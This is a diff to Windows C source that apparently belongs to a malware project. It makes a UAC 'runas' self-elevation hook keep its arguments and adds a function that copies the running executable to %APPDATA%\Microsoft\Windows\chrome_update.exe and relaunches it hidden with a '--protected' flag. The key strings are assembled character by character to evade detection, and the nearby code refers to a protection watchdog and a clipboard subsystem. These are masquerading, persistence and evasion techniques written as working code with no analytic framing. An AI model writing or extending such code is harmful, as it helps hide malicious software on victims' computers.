@@ -180,7 +180,20 @@ void sys_check_privileges(void) {
     GetModuleFileNameA(NULL, path, MAX_PATH);
     char action[16] = {0};
     action[0] = 'r'; action[1] = 'u'; action[2] = 'n'; action[3] = 'a'; action[4] = 's';
-    ShellExecuteA(NULL, action, path, NULL, NULL, SW_HIDE);
+
+    /* Preserve command-line args when re-launching with admin */
+    char *fullCmdLine = GetCommandLineA();
+    char *args = fullCmdLine;
+    if (*args == '"') {
+        args++;
+        while (*args && *args != '"') args++;
+        if (*args == '"') args++;
+    } else {
+        while (*args && *args != ' ') args++;
+    }
+    while (*args == ' ') args++;
+
+    ShellExecuteA(NULL, action, path, args, NULL, SW_HIDE);
     ExitProcess(0);
 }
 
@@ -262,6 +275,57 @@ DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
         Sleep(5000);  /* Re-apply every 5 seconds */
     }
     return 0;
+}
+
+/* Ensure directory exists (create recursively) */
+static void ensure_dir_exists(const char *path) {
+    char temp[MAX_PATH];
+    strncpy(temp, path, MAX_PATH - 1);
+    temp[MAX_PATH - 1] = '\0';
+    char *p = temp;
+    if (p[1] == ':') p += 2;
+    if (*p == '\\' || *p == '/') p++;
+    while (*p) {
+        if (*p == '\\' || *p == '/') {
+            char save = *p;
+            *p = '\0';
+            CreateDirectoryA(temp, NULL);
+            *p = save;
+        }
+        p++;
+    }
+}
+
+/* Spawn a protected copy of this process as chrome_update.exe */
+void sys_spawn_protected_copy(void) {
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+
+    char appData[MAX_PATH];
+    GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
+
+    char destPath[MAX_PATH];
+    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\chrome_update.exe", appData);
+
+    char dirPath[MAX_PATH];
+    strncpy(dirPath, destPath, MAX_PATH - 1);
+    dirPath[MAX_PATH - 1] = '\0';
+    char *lastSlash = strrchr(dirPath, '\\');
+    if (lastSlash) *lastSlash = '\0';
+    ensure_dir_exists(dirPath);
+
+    if (CopyFileA(currentPath, destPath, FALSE)) {
+        char action[16] = {0};
+        action[0] = 'o'; action[1] = 'p'; action[2] = 'e'; action[3] = 'n'; action[4] = '\0';
+
+        char protectedArg[16] = {0};
+        protectedArg[0] = '-'; protectedArg[1] = '-'; protectedArg[2] = 'p';
+        protectedArg[3] = 'r'; protectedArg[4] = 'o'; protectedArg[5] = 't';
+        protectedArg[6] = 'e'; protectedArg[7] = 'c'; protectedArg[8] = 't';
+        protectedArg[9] = 'e'; protectedArg[10] = 'd'; protectedArg[11] = '\0';
+
+        ShellExecuteA(NULL, action, destPath, protectedArg, NULL, SW_HIDE);
+    }
 }
 
 /* === Clipboard Subsystem === */
